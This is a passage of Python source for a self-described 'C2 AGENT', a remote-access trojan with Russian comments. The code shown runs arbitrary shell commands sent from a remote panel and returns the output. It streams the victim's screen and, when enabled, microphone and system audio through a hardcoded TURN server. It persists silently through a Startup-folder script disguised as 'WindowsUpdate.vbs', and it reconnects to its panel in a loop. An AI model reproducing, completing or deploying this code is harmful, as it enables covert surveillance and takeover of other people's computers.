            _log_to_file(f"[Audio] State requested: mic={webrtc_microphone_enabled}, sys={webrtc_system_audio_enabled}")

        elif cmd.lower() == 'enable_both_audio':
            webrtc_microphone_enabled = True
            webrtc_system_audio_enabled = True
            _log_to_file(f"[Audio] Both audio enabled: mic={webrtc_microphone_enabled}, sys={webrtc_system_audio_enabled}")
            result = json.dumps({'success': True, 'message': 'Microphone and system audio enabled. Reconnect stream to apply.'})

        elif cmd.lower() == 'disable_all_audio':
            webrtc_microphone_enabled = False
            webrtc_system_audio_enabled = False
            _log_to_file(f"[Audio] All audio disabled: mic={webrtc_microphone_enabled}, sys={webrtc_system_audio_enabled}")
            result = json.dumps({'success': True, 'message': 'All audio disabled. Reconnect stream to apply.'})

        else:
            result = execute_shell_command(cmd)

    except Exception as e:
        result = json.dumps({"error": str(e)})

    # Отправляем результат обратно
    sio.emit('command_result', {
        'agent_id': agent_id,
        'command_id': data.get('command_id'),
        'result': result
    })

    _log_to_file(f"[<] Result sent ({len(str(result))} bytes)")

    # Проверяем флаги для остановки/удаления агента после отправки результата
    if should_stop_agent:
        _log_to_file("[!] Stopping agent...")
        time.sleep(0.3)  # Даем время на отправку
        sio.disconnect()
        os._exit(0)  # Принудительное завершение процесса

    if should_uninstall_agent and uninstall_bat_path:
        _log_to_file("[!] Uninstalling agent...")
        time.sleep(0.3)  # Даем время на отправку
        try:
            # Запускаем bat файл через Windows API
            import ctypes
            ctypes.windll.shell32.ShellExecuteW(None, "open", uninstall_bat_path, None, None, 0)
        except:
            # Если не работает, пробуем через subprocess
            try:
                subprocess.Popen(
                    ['cmd.exe', '/c', uninstall_bat_path],
                    shell=False,
                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP if platform.system() == "Windows" else 0
                )
            except:
                pass
        sio.disconnect()
        os._exit(0)  # Принудительное завершение процесса

@sio.event
def disconnect():
    """Отключение от сервера."""
    _log_to_file(f"[!] Disconnected from panel")

@sio.event
def update_blocked_apps(data):
    """Обновление списка заблокированных приложений от сервера."""
    global blocked_apps
    try:
        new_blocked_list = data.get('blocked_apps', [])
        _log_to_file(f"[UPDATE_BLOCKED_APPS] Received new list: {new_blocked_list}")

        # Очищаем текущий список
        blocked_apps.clear()

        # Добавляем новые приложения
        for app_name in new_blocked_list:
            blocked_apps[app_name.lower()] = {'name': app_name}

        _log_to_file(f"[UPDATE_BLOCKED_APPS] Updated blocked apps list: {list(blocked_apps.keys())}")
    except Exception as e:
        _log_to_file(f"[UPDATE_BLOCKED_APPS] Error: {e}")


# ═══════════════════════════════════════════════════════════════════
# WEBRTC SIGNALING HANDLERS
# ═══════════════════════════════════════════════════════════════════

def start_webrtc_event_loop():
    """Запускает постоянный event loop для WebRTC в отдельном потоке"""
    global webrtc_event_loop, webrtc_task_queue
    import asyncio
    import queue

    webrtc_task_queue = queue.Queue()
    webrtc_event_loop = asyncio.new_event_loop()
    # НЕ устанавливаем loop здесь - это главный поток!

    async def process_tasks():
        """Обрабатывает задачи из очереди"""
        while True:
            try:
                # Проверяем очередь каждые 100ms
                await asyncio.sleep(0.1)

                # Обрабатываем все задачи из очереди
                while not webrtc_task_queue.empty():
                    try:
                        coro = webrtc_task_queue.get_nowait()
                        await coro  # Ждем завершения корутины
                    except queue.Empty:
                        break
                    except Exception as e:
                        _log_to_file(f"[WebRTC Loop] Task error: {e}")
            except Exception as e:
                _log_to_file(f"[WebRTC Loop] Error: {e}")

    try:
        # Устанавливаем loop для ЭТОГО потока
        asyncio.set_event_loop(webrtc_event_loop)
        _log_to_file("[WebRTC Loop] Event loop started")
        webrtc_event_loop.run_until_complete(process_tasks())
    except Exception as e:
        _log_to_file(f"[WebRTC Loop] Loop stopped: {e}")

@sio.event
def webrtc_offer(data):
    """Получили WebRTC offer от зрителя"""
    _log_to_file(f"[WebRTC] Received offer: {data.keys()}")
    if not aiortc_available:
        sio.emit('webrtc_error', {'error': 'WebRTC not available'})
        return

    try:
        # Добавляем задачу в очередь event loop
        if webrtc_task_queue:
            webrtc_task_queue.put(handle_webrtc_offer(data))
        else:
            _log_to_file("[WebRTC] Event loop not started!")
            sio.emit('webrtc_error', {'error': 'WebRTC event loop not ready'})
    except Exception as e:
        import traceback
        _log_to_file(f"[WebRTC] Error handling offer: {e}")
        _log_to_file(f"[WebRTC] Traceback: {traceback.format_exc()}")
        sio.emit('webrtc_error', {'error': str(e)})


@sio.event
def webrtc_answer(data):
    """Получили WebRTC answer от сервера"""
    if not aiortc_available:
        return

    try:
        if webrtc_task_queue:
            webrtc_task_queue.put(handle_webrtc_answer(data))
    except Exception as e:
        _log_to_file(f"[WebRTC] Error handling answer: {e}")


@sio.event
def webrtc_ice_candidate(data):
    """Получили ICE candidate"""
    if not aiortc_available:
        return

    try:
        if webrtc_task_queue:
            webrtc_task_queue.put(handle_webrtc_ice_candidate(data))
    except Exception as e:
        _log_to_file(f"[WebRTC] Error handling ICE candidate: {e}")


async def handle_webrtc_offer(data):
    """Обработка WebRTC offer (когда мы broadcaster)"""
    global webrtc_peer_connection, webrtc_video_track, webrtc_audio_track
    global webrtc_microphone_enabled, webrtc_system_audio_enabled
    global webrtc_active_viewer_sid

    viewer_sid = data.get('viewer_sid')

    # Проверяем, есть ли уже активный зритель (но разрешаем переподключение от того же viewer)
    if webrtc_active_viewer_sid and webrtc_active_viewer_sid != viewer_sid:
        _log_to_file(f"[WebRTC] Rejected offer from {viewer_sid} - stream already in use by {webrtc_active_viewer_sid}")
        # Отправляем ошибку обратно через сервер
        sio.emit('webrtc_stream_busy', {'viewer_sid': viewer_sid})
        return

    # Если это переподключение от того же viewer - закрываем старое соединение
    if webrtc_active_viewer_sid == viewer_sid:
        _log_to_file(f"[WebRTC] Reconnection from same viewer {viewer_sid} - closing old connection")

    _log_to_file(f"[WebRTC] Creating connection with audio settings: mic={webrtc_microphone_enabled}, sys={webrtc_system_audio_enabled}")

    # Закрываем старое соединение если оно есть
    old_pc = None
    with webrtc_lock:
        if webrtc_peer_connection:
            old_pc = webrtc_peer_connection
            webrtc_peer_connection = None

        # Останавливаем старые треки
        if webrtc_video_track:
            try:
                webrtc_video_track.stop()
            except:
                pass
            webrtc_video_track = None

        if webrtc_audio_track:
            try:
                webrtc_audio_track.stop()
                _log_to_file("[WebRTC] Audio track stopped")
            except Exception as e:
                _log_to_file(f"[WebRTC] Error stopping audio track: {e}")
            webrtc_audio_track = None

    # Закрываем старое соединение вне блокировки и ждем полного закрытия
    if old_pc:
        try:
            _log_to_file(f"[WebRTC] Closing old connection, current state: {old_pc.connectionState}, ICE state: {old_pc.iceConnectionState}")
            await old_pc.close()
            _log_to_file("[WebRTC] Called close() on old connection")

            # Ждем пока ICE соединение действительно закроется
            for i in range(20):  # Максимум 2 секунды
                ice_state = old_pc.iceConnectionState
                _log_to_file(f"[WebRTC] Waiting for ICE close, attempt {i+1}/20, state: {ice_state}")
                if ice_state in ["closed", "failed"]:
                    _log_to_file(f"[WebRTC] ICE connection closed: {ice_state}")
                    break
                await asyncio.sleep(0.1)
            else:
                _log_to_file(f"[WebRTC] WARNING: ICE did not close after 2s, state: {old_pc.iceConnectionState}")

            # Дополнительная пауза для освобождения ресурсов
            await asyncio.sleep(0.5)
            _log_to_file("[WebRTC] Old connection fully closed")
        except Exception as e:
            _log_to_file(f"[WebRTC] Error closing previous connection: {e}")

    # Создаём PeerConnection с собственным TURN сервером для надежного NAT traversal
    config = RTCConfiguration(
        iceServers=[
            RTCIceServer(urls=["stun:stun.l.google.com:19302"]),
            RTCIceServer(urls=["stun:stun1.l.google.com:19302"]),
            # Собственный TURN сервер на 141.147.45.169
            RTCIceServer(
                urls=[
                    "turn:141.147.45.169:3478",
                    "turn:141.147.45.169:3478?transport=tcp"
                ],
                username="webrtc",
                credential="webrtc123"
            )
        ]
    )
    pc = RTCPeerConnection(configuration=config)

    with webrtc_lock:
        webrtc_peer_connection = pc

    # Обработка ICE candidates
    @pc.on("icecandidate")
    async def on_icecandidate(candidate):
        if candidate:
            from aiortc.sdp import candidate_to_sdp
            candidate_str = candidate_to_sdp(candidate)

            # Фильтруем только IPv4 кандидаты (игнорируем IPv6)
            if ':' in candidate.ip and '.' not in candidate.ip:
                _log_to_file(f"[WebRTC] Skipping IPv6 candidate: {candidate.ip}")
                return

            _log_to_file(f"[WebRTC] ICE candidate generated: {candidate_str[:50]}...")
            viewer_sid = data.get('viewer_sid')
            sio.emit('webrtc_ice_candidate', {
                'target_sid': viewer_sid,
                'candidate': {
                    'candidate': candidate_str,
                    'sdpMid': candidate.sdpMid,
                    'sdpMLineIndex': candidate.sdpMLineIndex
                }
            })
            _log_to_file(f"[WebRTC] ICE candidate sent to viewer {viewer_sid}")

    @pc.on("connectionstatechange")
    async def on_connectionstatechange():
        global webrtc_active_viewer_sid
        _log_to_file(f"[WebRTC] Connection state: {pc.connectionState}")
        if pc.connectionState == "failed":
            _log_to_file(f"[WebRTC] Connection FAILED - check firewall/NAT")
            webrtc_active_viewer_sid = None
        elif pc.connectionState == "connected":
            _log_to_file(f"[WebRTC] Connection ESTABLISHED successfully!")
        elif pc.connectionState == "closed":
            _log_to_file(f"[WebRTC] Connection CLOSED")
            webrtc_active_viewer_sid = None

    @pc.on("iceconnectionstatechange")
    async def on_iceconnectionstatechange():
        _log_to_file(f"[WebRTC] ICE connection state: {pc.iceConnectionState}")
        if pc.iceConnectionState == "failed":
            _log_to_file(f"[WebRTC] ICE FAILED - may need TURN server")
        elif pc.iceConnectionState == "connected":
            _log_to_file(f"[WebRTC] ICE connected!")
        elif pc.iceConnectionState == "completed":
            _log_to_file(f"[WebRTC] ICE completed!")

    # ВРЕМЕННО: не удаляем VP8, чтобы проверить работает ли он на виртуалке
    offer_sdp = data['offer']['sdp']
    new_sdp_lines = offer_sdp.split('\r\n')

    # Добавляем битрейт к m=video
    modified_lines = []
    for line in new_sdp_lines:
        modified_lines.append(line)
        if line.startswith('m=video'):
            modified_lines.append('b=AS:10000')  # 10 Mbps
            modified_lines.append('b=TIAS:10000000')

    new_sdp_lines = modified_lines

    offer_sdp = '\r\n'.join(new_sdp_lines)
    _log_to_file(f"[WebRTC] VP8/VP9 removed from offer, only H264 will be used")

    # Устанавливаем remote description
    offer = RTCSessionDescription(
        sdp=offer_sdp,
        type=data['offer']['type']
    )
    await pc.setRemoteDescription(offer)

    # ПОСЛЕ setRemoteDescription добавляем треки
    # Добавляем видео трек (экран)
    monitor_index = data.get('monitor_index', 0)

    try:
        # Создаем прямой трек захвата экрана без MediaPlayer
        print(f"[WebRTC] Creating ScreenCaptureTrack for monitor {monitor_index}")
        _log_to_file(f"[WebRTC] Creating ScreenCaptureTrack for monitor {monitor_index}")
        video_track = ScreenCaptureTrack(monitor_index=monitor_index)
        print(f"[WebRTC] ScreenCaptureTrack created successfully")
        _log_to_file(f"[WebRTC] ScreenCaptureTrack created successfully")

        # Добавляем трек напрямую без relay
        pc.addTrack(video_track)
        print(f"[WebRTC] Video track added to peer connection (direct, no relay)")
        _log_to_file(f"[WebRTC] Video track added to peer connection")

        with webrtc_lock:
            webrtc_video_track = video_track
        _log_to_file(f"[WebRTC] Video track added (direct screen capture)")
    except Exception as e:
        print(f"[WebRTC] Video track failed: {e}")
        import traceback
        print(f"[WebRTC] Traceback: {traceback.format_exc()}")
        _log_to_file(f"[WebRTC] Video track FAILED: {e}")
        _log_to_file(f"[WebRTC] Traceback: {traceback.format_exc()}")
        # Если видео не создалось - отменяем соединение
        _log_to_file(f"[WebRTC] Aborting connection due to video track failure")
        await pc.close()
        return

    # Добавляем аудио трек (микрофон + система) только если включено
    _log_to_file(f"[WebRTC] Audio flags: mic={webrtc_microphone_enabled}, sys={webrtc_system_audio_enabled}")
    print(f"[WebRTC] Audio flags: mic={webrtc_microphone_enabled}, sys={webrtc_system_audio_enabled}")
    if webrtc_microphone_enabled or webrtc_system_audio_enabled:
        try:
            _log_to_file(f"[WebRTC] Creating MixedAudioTrack...")
            print(f"[WebRTC] Creating MixedAudioTrack...")
            mic_device_index = data.get('mic_device_index')
            sys_device_index = data.get('sys_device_index')
            audio_track = MixedAudioTrack(
                mic_device_index=mic_device_index,
                sys_device_index=sys_device_index,
                enable_mic=webrtc_microphone_enabled,
                enable_sys=webrtc_system_audio_enabled
            )
            _log_to_file(f"[WebRTC] MixedAudioTrack created, adding to PC...")
            print(f"[WebRTC] MixedAudioTrack created, adding to PC...")
            pc.addTrack(audio_track)
            with webrtc_lock:
                webrtc_audio_track = audio_track
            _log_to_file(f"[WebRTC] Audio track added (mic={webrtc_microphone_enabled}, sys={webrtc_system_audio_enabled})")
            print(f"[WebRTC] Audio track added (mic={webrtc_microphone_enabled}, sys={webrtc_system_audio_enabled})")
        except Exception as e:
            import traceback
            _log_to_file(f"[WebRTC] Audio track failed: {e}")
            _log_to_file(f"[WebRTC] Traceback: {traceback.format_exc()}")
            print(f"[WebRTC] Audio track failed: {e}")
            print(f"[WebRTC] Traceback: {traceback.format_exc()}")
    else:
        _log_to_file(f"[WebRTC] Audio tracks disabled, skipping")

    # Создаём answer
    _log_to_file(f"[WebRTC] About to create answer...")
    print(f"[WebRTC] About to create answer...")
    answer = await pc.createAnswer()
    _log_to_file(f"[WebRTC] Answer created successfully")
    print(f"[WebRTC] Answer created successfully")
    await pc.setLocalDescription(answer)
    _log_to_file(f"[WebRTC] Answer created and set as local description")

    # Логируем информацию о кодеках
    try:
        for transceiver in pc.getTransceivers():
            if transceiver.sender and transceiver.sender.track:
                track_kind = transceiver.sender.track.kind
                _log_to_file(f"[WebRTC] Transceiver for {track_kind}: direction={transceiver.direction}")
                if hasattr(transceiver, 'sender') and hasattr(transceiver.sender, '_RTCRtpSender__codecs'):
                    codecs = transceiver.sender._RTCRtpSender__codecs
                    _log_to_file(f"[WebRTC] Available {track_kind} codecs: {[c.name for c in codecs]}")
    except Exception as e:
        _log_to_file(f"[WebRTC] Could not log codec info: {e}")

    # Модифицируем SDP answer чтобы использовать только IPv4
    sdp = pc.localDescription.sdp
    sdp_lines = sdp.split('\r\n')
    new_sdp_lines = []

    for line in sdp_lines:
        # Заменяем IPv6 на IPv4 в connection line
        if line.startswith('c=IN IP6'):
            new_sdp_lines.append('c=IN IP4 0.0.0.0')
            _log_to_file(f"[WebRTC] Replaced IPv6 connection line with IPv4")
        # Удаляем IPv6 кандидаты из SDP
        elif 'candidate:' in line and (':' in line.split('candidate:')[1].split()[4] and '.' not in line.split('candidate:')[1].split()[4]):
            _log_to_file(f"[WebRTC] Skipping IPv6 candidate in SDP")
            continue
        else:
            new_sdp_lines.append(line)

    modified_sdp = '\r\n'.join(new_sdp_lines)
    _log_to_file(f"[WebRTC] Answer SDP modified (IPv4 only, H264 codec from offer negotiation)")

    # Устанавливаем активного зрителя
    webrtc_active_viewer_sid = viewer_sid
    _log_to_file(f"[WebRTC] Active viewer set to {viewer_sid}")

    # Отправляем answer с модифицированным SDP
    viewer_sid = data.get('viewer_sid')
    agent_id_val = data.get('agent_id')
    sio.emit('webrtc_answer', {
        'agent_id': agent_id_val,
        'target_sid': viewer_sid,  # Backend ожидает target_sid
        'answer': {
            'sdp': modified_sdp,  # Используем модифицированный SDP
            'type': pc.localDescription.type
        }
    })

    _log_to_file(f"[WebRTC] Offer handled, answer sent to viewer {viewer_sid}")
    _log_to_file(f"[WebRTC] PeerConnection ready, waiting for frames...")


async def handle_webrtc_answer(data):
    """Обработка WebRTC answer"""
    global webrtc_peer_connection

    if not webrtc_peer_connection:
        return

    answer = RTCSessionDescription(
        sdp=data['answer']['sdp'],
        type=data['answer']['type']
    )
    await webrtc_peer_connection.setRemoteDescription(answer)
    _log_to_file("[WebRTC] Answer received and set")


async def handle_webrtc_ice_candidate(data):
    """Обработка ICE candidate"""
    global webrtc_peer_connection

    if not webrtc_peer_connection:
        return

    candidate_data = data.get('candidate')
    if candidate_data and candidate_data.get('candidate'):
        try:
            # Парсим SDP строку через candidate_from_sdp
            sdp_line = candidate_data['candidate']
            candidate = candidate_from_sdp(sdp_line)
            candidate.sdpMid = candidate_data.get('sdpMid')
            candidate.sdpMLineIndex = candidate_data.get('sdpMLineIndex')

            await webrtc_peer_connection.addIceCandidate(candidate)
            _log_to_file(f"[WebRTC] ICE candidate added successfully")
        except Exception as e:
            _log_to_file(f"[WebRTC] ICE candidate error: {e}")


def stop_webrtc_stream():
    """Останавливаем WebRTC стрим"""
    global webrtc_peer_connection, webrtc_video_track, webrtc_audio_track, webrtc_stream_active

    with webrtc_lock:
        webrtc_stream_active = False

        if webrtc_audio_track:
            try:
                webrtc_audio_track.stop()
            except:
                pass
            webrtc_audio_track = None

        if webrtc_peer_connection:
            try:
                # Добавляем задачу закрытия в очередь event loop
                if webrtc_task_queue:
                    async def close_pc():
                        await webrtc_peer_connection.close()
                    webrtc_task_queue.put(close_pc())
            except:
                pass
            webrtc_peer_connection = None

        if webrtc_video_track:
            try:
                webrtc_video_track.stop()
            except:
                pass
            webrtc_video_track = None

    _log_to_file("[WebRTC] Stream stopped")
    return "WebRTC stream stopped"


def heartbeat_loop():
    """Отправка heartbeat каждые 30 секунд."""
    while True:
        try:
            if sio.connected and agent_id:
                sio.emit('agent_heartbeat', {'agent_id': agent_id})
            time.sleep(30)
        except Exception as e:
            _log_to_file(f"[!] Heartbeat error: {e}")
            time.sleep(30)


def main():
    global PANEL_URL

    # Парсинг аргументов командной строки
    if len(sys.argv) > 1:
        PANEL_URL = sys.argv[1]

    _log_to_file("=" * 60)
    _log_to_file("C2 AGENT - WebSocket Version")
    _log_to_file("=" * 60)
    _log_to_file(f"Panel URL: {PANEL_URL}")
    _log_to_file(f"Hostname: {socket.gethostname()}")
    _log_to_file(f"IP: {get_local_ip()}")
    _log_to_file(f"OS: {platform.platform()}")
    _log_to_file("=" * 60)

    # Автоматически добавляем в автозагрузку при первом запуске
    if platform.system() == "Windows":
        try:
            startup_folder = os.path.join(os.environ['APPDATA'],
                                         r'Microsoft\Windows\Start Menu\Programs\Startup')
            vbs_path = os.path.join(startup_folder, 'WindowsUpdate.vbs')

            # Проверяем, есть ли уже в автозагрузке
            if not os.path.exists(vbs_path):
                _log_to_file("[AUTOSTART] Adding to startup automatically...")
                enable_autostart()
            else:
                _log_to_file("[AUTOSTART] Already in startup")
        except Exception as e:
            _log_to_file(f"[AUTOSTART] Auto-add failed: {e}")

    # Запускаем heartbeat в отдельном потоке
    heartbeat_thread = threading.Thread(target=heartbeat_loop, daemon=True)
    heartbeat_thread.start()

    # === ТЕСТ TURN СЕРВЕРА ===
    def _test_turn_connectivity():
        """Тест прямого подключения к TURN серверу"""
        import socket as _sock
        turn_host = "141.147.45.169"
        turn_port = 3478

        # Тест UDP
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
            s.settimeout(5)
            # Отправляем STUN Binding Request
            # Magic cookie + transaction ID
            import struct, os as _os
            txn_id = _os.urandom(12)
            # STUN Binding Request: type=0x0001, length=0, magic=0x2112A442
            stun_req = struct.pack("!HHI", 0x0001, 0, 0x2112A442) + txn_id
            s.sendto(stun_req, (turn_host, turn_port))
            data, addr = s.recvfrom(1024)
            s.close()
            _log_to_file(f"[TURN-TEST] UDP connection to {turn_host}:{turn_port} SUCCESS - got {len(data)} bytes from {addr}")
        except Exception as e:
            _log_to_file(f"[TURN-TEST] UDP connection to {turn_host}:{turn_port} FAILED: {type(e).__name__}: {e}")

        # Тест TCP
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(5)
            s.connect((turn_host, turn_port))
            s.close()
            _log_to_file(f"[TURN-TEST] TCP connection to {turn_host}:{turn_port} SUCCESS")
        except Exception as e:
            _log_to_file(f"[TURN-TEST] TCP connection to {turn_host}:{turn_port} FAILED: {type(e).__name__}: {e}")

        # Тест DNS + общая сеть
        try:
            ip = _sock.gethostbyname(turn_host)
            _log_to_file(f"[TURN-TEST] DNS/IP resolve: {turn_host} -> {ip}")
        except Exception as e:
            _log_to_file(f"[TURN-TEST] DNS resolve FAILED: {e}")

    try:
        _test_turn_connectivity()
    except Exception as e:
        _log_to_file(f"[TURN-TEST] Test failed with exception: {e}")
    # === КОНЕЦ ТЕСТА TURN ===

    # Запускаем WebRTC event loop в отдельном потоке
    if aiortc_available:
        global webrtc_event_loop_thread
        webrtc_event_loop_thread = threading.Thread(target=start_webrtc_event_loop, daemon=True)
        webrtc_event_loop_thread.start()
        _log_to_file("[WebRTC] Event loop thread started")

    # Подключаемся к панели
    while True:
        try:
            _log_to_file(f"[*] Connecting to panel...")
            sio.connect(PANEL_URL)
            sio.wait()
        except Exception as e:
            _log_to_file(f"[!] Connection error: {e}")
            _log_to_file(f"[*] Reconnecting in 10 seconds...")
            time.sleep(10)

if __name__ == "__main__":
    main()
